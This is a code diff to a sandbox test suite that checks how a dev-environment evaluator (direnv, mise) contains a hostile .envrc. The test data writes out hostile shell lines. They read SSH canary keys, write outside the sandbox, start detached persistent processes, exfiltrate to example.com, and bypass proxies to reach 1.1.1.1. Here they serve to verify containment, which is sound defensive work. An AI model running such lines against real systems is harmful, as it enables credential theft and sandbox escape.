@@ -8,7 +8,10 @@ import {
 	parseNixDevEnv,
 	watchedRepoPaths,
 } from "../src/containment/dev-env-capture.ts";
-import { envBuildAllowlist } from "../src/containment/dev-env-egress.ts";
+import {
+	ENV_BUILD_EGRESS,
+	envBuildAllowlist,
+} from "../src/containment/dev-env-egress.ts";
 import {
 	bwrapSkipReason,
 	createEnvLab,
@@ -179,12 +182,23 @@ describe.skipIf(skip !== null)("evaluating a dev environment", () => {
 				"/cache/env-data/mise/installs/jq/1.7.1",
 			);
 			expect(existsSync(join(dataDir, "mise/installs/jq/1.7.1/jq"))).toBe(true);
-			// Host-observed: only allowlisted hosts were reached, none refused.
-			expect(Object.keys(r.egress?.allowed ?? {}).sort()).toEqual([
-				"github.com:443",
-				"mise-versions.jdx.dev:443",
-				"release-assets.githubusercontent.com:443",
-			]);
+			// Host-observed: every host reached is a recorded mise entry, none was
+			// refused, and the index and the release download were reached. Not
+			// the exact set: which extra hosts mise asks changes between mise
+			// versions (2026.6.5 also asks api.github.com), and an unrecorded one
+			// fails the subset check, so dev-env-egress.ts stays the record.
+			const miseHosts = ENV_BUILD_EGRESS.filter((e) =>
+				e.purpose.startsWith("mise-"),
+			).map((e) => `${e.host}:${e.port}`);
+			const reached = Object.keys(r.egress?.allowed ?? {});
+			for (const host of reached) expect(miseHosts).toContain(host);
+			expect(reached).toEqual(
+				expect.arrayContaining([
+					"github.com:443",
+					"mise-versions.jdx.dev:443",
+					"release-assets.githubusercontent.com:443",
+				]),
+			);
 			expect(r.egress?.denied).toEqual({});
 			expect(existsSync(join(lab.home, ".config/mise"))).toBe(false);
 			expect(existsSync(join(lab.home, ".local/share/mise"))).toBe(false);
@@ -200,6 +214,20 @@ describe.skipIf(skip !== null || noDirenv !== null)("a hostile .envrc", () => {
 	});
 	afterAll(() => lab.dispose());
 
+	// The hostile tests' own deadline, well under their test timeout, so a run
+	// that is not stopped fails fast through lab.run's guard, naming its phase.
+	const HOSTILE_DEADLINE_MS = 60_000;
+	const HOSTILE_TEST_MS = 120_000;
+
+	/**
+	 * Starts its command fully detached, the way a daemon does: std streams on
+	 * /dev/null and every other inherited descriptor closed. direnv runs the
+	 * .envrc with a pipe on fd 3 and some direnv versions (2.37) wait for it to
+	 * close, so a job that kept it would hold the evaluation until its
+	 * deadline; that case has its own test below.
+	 */
+	const DETACH = `detach() { ( for p in /proc/$BASHPID/fd/*; do n=\${p##*/}; [ "$n" -gt 2 ] && eval "exec $n>&-"; done; exec "$@" ) </dev/null >/dev/null 2>&1 & }`;
+
 	const collect =
 		(into: Record<string, string>, names: string[]) => async (tree: string) => {
 			for (const n of names) {
@@ -208,80 +236,131 @@ describe.skipIf(skip !== null || noDirenv !== null)("a hostile .envrc", () => {
 			}
 		};
 
-	test("positive control: it can write its tree and reach an allowlisted host", async () => {
-		const { root, commit } = await lab.repo("positive", {
-			".envrc": [
-				"echo mine > /work/wrote",
-				'bun -e \'const r = await fetch("https://github.com/"); await Bun.write("/work/net", String(r.status < 400))\' >/dev/null 2>&1',
-				"export POSITIVE=1",
-				"",
-			].join("\n"),
-		});
-		const seen: Record<string, string> = {};
-		const r = await lab.run(root, commit, {
-			step: "direnv",
-			allow: envBuildAllowlist(),
-			collectTree: collect(seen, ["wrote", "net"]),
-		});
-		if (!r.ok) console.log(r.reason, r.log);
-		expect(r.ok).toBe(true);
-		expect(seen).toEqual({ wrote: "mine", net: "true" });
-		expect(r.ok && parseDirenvExport(r.output.toString()).POSITIVE).toBe("1");
-		expect(Object.keys(r.egress?.allowed ?? {})).toContain("github.com:443");
-	}, 300_000);
-
-	test("it cannot read the home, write outside, keep a process or exfiltrate", async () => {
-		const { root, commit } = await lab.repo("hostile", {
-			".envrc": "",
-		});
-		const dataDir = join(lab.mfwHome, "env", "data", "hostile");
-		const { root: hostileRoot, commit: hostileCommit } = await lab.repo(
-			"hostile2",
-			{
+	test(
+		"positive control: it can write its tree and reach an allowlisted host",
+		async () => {
+			const { root, commit } = await lab.repo("positive", {
 				".envrc": [
-					`cat "${lab.canaries.ssh}" > /work/stolen 2>/dev/null || echo blocked > /work/read`,
-					'cat "$HOME/.ssh/id_canary" >> /work/stolen 2>/dev/null || true',
-					`( echo x > "${root}/pwned" ) 2>/dev/null; ( echo x > "${lab.home}/pwned" ) 2>/dev/null`,
-					"( echo x > /nix/store/pwned ) 2>/dev/null; ( echo x > /etc/pwned ) 2>/dev/null",
-					"( while :; do date +%s%N > /cache/env-data/heartbeat; sleep 0.2; done ) >/dev/null 2>&1 </dev/null &",
-					"bun -e 'Bun.serve({ port: 8099, fetch: () => new Response(\"x\") })' >/dev/null 2>&1 </dev/null &",
-					"for i in $(seq 1 64); do sleep 300 >/dev/null 2>&1 </dev/null & done",
-					'bun -e \'try { const r = await fetch("https://example.com/?d=canary"); await Bun.write("/work/exfil", r.status < 400 ? "reached" : "blocked " + r.status) } catch { await Bun.write("/work/exfil", "blocked") }\' >/dev/null 2>&1',
-					'env -u https_proxy -u HTTPS_PROXY -u http_proxy -u HTTP_PROXY -u ALL_PROXY -u all_proxy bun -e \'try { await fetch("https://1.1.1.1/"); await Bun.write("/work/direct", "reached") } catch { await Bun.write("/work/direct", "blocked") }\' >/dev/null 2>&1',
-					"export HOSTILE=done",
+					"echo mine > /work/wrote",
+					'bun -e \'const r = await fetch("https://github.com/"); await Bun.write("/work/net", String(r.status < 400))\' >/dev/null 2>&1',
+					"export POSITIVE=1",
 					"",
 				].join("\n"),
-			},
-		);
-		void commit;
-		const seen: Record<string, string> = {};
-		const r = await lab.run(hostileRoot, hostileCommit, {
-			step: "direnv",
-			allow: envBuildAllowlist(),
-			dataDir,
-			collectTree: collect(seen, ["stolen", "read", "exfil", "direct"]),
-		});
-		if (!r.ok) console.log(r.reason, r.log);
-		expect(r.ok).toBe(true);
-		expect(seen.stolen ?? "").toBe("");
-		expect(seen.read).toBe("blocked");
-		expect(seen.exfil).toStartWith("blocked");
-		expect(seen.direct).toBe("blocked");
-		expect(Object.keys(r.egress?.denied ?? {})).toContain("example.com:443");
-		lab.assertCanaries();
-		for (const p of [
-			join(root, "pwned"),
-			join(lab.home, "pwned"),
-			"/nix/store/pwned",
-		]) {
-			expect(existsSync(p)).toBe(false);
-		}
-		// Nothing it started outlives the sandbox.
-		const beat = join(dataDir, "heartbeat");
-		const before = existsSync(beat) ? readFileSync(beat, "utf8") : "";
-		await Bun.sleep(1200);
-		expect(existsSync(beat) ? readFileSync(beat, "utf8") : "").toBe(before);
-	}, 300_000);
+			});
+			const seen: Record<string, string> = {};
+			const r = await lab.run(root, commit, {
+				step: "direnv",
+				allow: envBuildAllowlist(),
+				timeoutMs: HOSTILE_DEADLINE_MS,
+				collectTree: collect(seen, ["wrote", "net"]),
+			});
+			if (!r.ok) console.log(r.reason, r.log);
+			expect(r.ok).toBe(true);
+			expect(seen).toEqual({ wrote: "mine", net: "true" });
+			expect(r.ok && parseDirenvExport(r.output.toString()).POSITIVE).toBe("1");
+			expect(Object.keys(r.egress?.allowed ?? {})).toContain("github.com:443");
+		},
+		HOSTILE_TEST_MS,
+	);
+
+	test(
+		"it cannot read the home, write outside, keep a process or exfiltrate",
+		async () => {
+			const { root, commit } = await lab.repo("hostile", {
+				".envrc": "",
+			});
+			const dataDir = join(lab.mfwHome, "env", "data", "hostile");
+			const { root: hostileRoot, commit: hostileCommit } = await lab.repo(
+				"hostile2",
+				{
+					".envrc": [
+						`cat "${lab.canaries.ssh}" > /work/stolen 2>/dev/null || echo blocked > /work/read`,
+						'cat "$HOME/.ssh/id_canary" >> /work/stolen 2>/dev/null || true',
+						`( echo x > "${root}/pwned" ) 2>/dev/null; ( echo x > "${lab.home}/pwned" ) 2>/dev/null`,
+						"( echo x > /nix/store/pwned ) 2>/dev/null; ( echo x > /etc/pwned ) 2>/dev/null",
+						DETACH,
+						"date +%s%N > /cache/env-data/heartbeat",
+						"detach sh -c 'while :; do date +%s%N > /cache/env-data/heartbeat; sleep 0.2; done'",
+						"detach bun -e 'Bun.serve({ port: 8099, fetch: () => new Response(\"x\") })'",
+						"for i in $(seq 1 64); do detach sleep 300; done",
+						'bun -e \'try { const r = await fetch("https://example.com/?d=canary"); await Bun.write("/work/exfil", r.status < 400 ? "reached" : "blocked " + r.status) } catch { await Bun.write("/work/exfil", "blocked") }\' >/dev/null 2>&1',
+						'env -u https_proxy -u HTTPS_PROXY -u http_proxy -u HTTP_PROXY -u ALL_PROXY -u all_proxy bun -e \'try { await fetch("https://1.1.1.1/"); await Bun.write("/work/direct", "reached") } catch { await Bun.write("/work/direct", "blocked") }\' >/dev/null 2>&1',
+						"export HOSTILE=done",
+						"",
+					].join("\n"),
+				},
+			);
+			void commit;
+			const seen: Record<string, string> = {};
+			const r = await lab.run(hostileRoot, hostileCommit, {
+				step: "direnv",
+				allow: envBuildAllowlist(),
+				dataDir,
+				timeoutMs: HOSTILE_DEADLINE_MS,
+				collectTree: collect(seen, ["stolen", "read", "exfil", "direct"]),
+			});
+			if (!r.ok) console.log(r.reason, r.log);
+			expect(r.ok).toBe(true);
+			expect(seen.stolen ?? "").toBe("");
+			expect(seen.read).toBe("blocked");
+			expect(seen.exfil).toStartWith("blocked");
+			expect(seen.direct).toBe("blocked");
+			expect(Object.keys(r.egress?.denied ?? {})).toContain("example.com:443");
+			lab.assertCanaries();
+			for (const p of [
+				join(root, "pwned"),
+				join(lab.home, "pwned"),
+				"/nix/store/pwned",
+			]) {
+				expect(existsSync(p)).toBe(false);
+			}
+			// Nothing it started outlives the sandbox.
+			const beat = join(dataDir, "heartbeat");
+			const before = existsSync(beat) ? readFileSync(beat, "utf8") : "";
+			expect(before).not.toBe("");
+			await Bun.sleep(1200);
+			expect(existsSync(beat) ? readFileSync(beat, "utf8") : "").toBe(before);
+		},
+		HOSTILE_TEST_MS,
+	);
+
+	test(
+		"a process that keeps direnv's pipe open ends with the step, by its deadline",
+		async () => {
+			const dataDir = join(lab.mfwHome, "env", "data", "holder");
+			const { root, commit } = await lab.repo("holder", {
+				".envrc": [
+					"date +%s%N > /cache/env-data/heartbeat",
+					"( while :; do date +%s%N > /cache/env-data/heartbeat; sleep 0.2; done ) >/dev/null 2>&1 </dev/null &",
+					"export HOLDER=1",
+					"",
+				].join("\n"),
+			});
+			const started = Date.now();
+			const r = await lab.run(root, commit, {
+				step: "direnv",
+				allow: envBuildAllowlist(),
+				dataDir,
+				timeoutMs: 10_000,
+			});
+			if (!r.ok) console.log(r.code, r.reason, r.log);
+			// direnv 2.37 waits for the pipe and the deadline stops the step;
+			// direnv 2.38 returns at once. Either way the step ends in bounded time
+			// and the process it left behind does not survive it.
+			if (r.ok) {
+				expect(parseDirenvExport(r.output.toString()).HOLDER).toBe("1");
+			} else {
+				expect(r.code).toBe("timed_out");
+			}
+			expect(Date.now() - started).toBeLessThan(40_000);
+			const beat = join(dataDir, "heartbeat");
+			const before = existsSync(beat) ? readFileSync(beat, "utf8") : "";
+			expect(before).not.toBe("");
+			await Bun.sleep(1200);
+			expect(existsSync(beat) ? readFileSync(beat, "utf8") : "").toBe(before);
+		},
+		HOSTILE_TEST_MS,
+	);
 
 	test("a hanging .envrc is stopped at its deadline", async () => {
 		const { root, commit } = await lab.repo("hang", {
